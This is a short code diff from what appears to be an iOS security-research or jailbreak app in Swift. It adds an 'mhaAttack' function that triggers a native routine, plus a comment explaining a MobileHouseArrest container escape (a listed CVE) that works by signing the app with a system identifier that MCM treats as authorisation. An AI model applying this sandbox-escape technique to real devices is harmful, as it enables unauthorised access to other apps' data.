@@ -175,6 +175,19 @@ final class AppState: ObservableObject {
        Durable log: Documents/perm.log */
     /* MCM / house_arrest reachability with the new entitlements.
        Durable log: Documents/mcm.log */
+    /* The MobileHouseArrest container escape (CVE-2026-43689). The app must
+       be signed with the CodeDirectory identifier
+       "com.apple.mobile.MobileHouseArrest" - that identifier IS the
+       authorisation key MCM checks. Durable log: Documents/mha.log */
+    func mhaAttack() {
+        start {
+            let bid = Bundle.main.bundleIdentifier ?? "?"
+            AppState.shared.append("IDENT: \(bid)")
+            nk_mha_attack()
+            return true
+        }
+    }
+
     func mcmProbe() {
         start {
             // The identifier we were signed with is exactly the string MCM
